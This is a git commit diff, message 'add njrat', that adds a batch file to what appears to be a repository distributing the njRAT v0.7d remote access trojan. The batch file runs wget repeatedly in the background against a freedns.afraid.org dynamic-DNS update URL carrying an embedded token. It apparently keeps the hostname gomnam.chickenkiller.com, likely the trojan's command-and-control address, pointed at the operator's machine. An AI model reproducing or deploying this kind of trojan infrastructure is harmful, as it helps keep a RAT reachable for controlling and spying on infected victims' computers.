a2bcd8e9a4fc0a0ac2bbe2d8e9813495feb9ec3e
rezaduty <reza.duty.persian@gmail.com>
2019-06-07 11:02:41 +0430

    add njrat

---
+++ R4T/nJRAT/njRAT-v0.7d/gomnam.chickenkiller.com.bat
@@ -0,0 +1,3 @@
+rem gomnam.chickenkiller.com
+cd %~DP0
+wget -q --read-timeout=0.0 --waitretry=5 --tries=400 --background http://freedns.afraid.org/dynamic/update.php?QjczMVI3cXVZM0RwTGFYbHo5T0c0VmI5OjEyMTAzOTc0
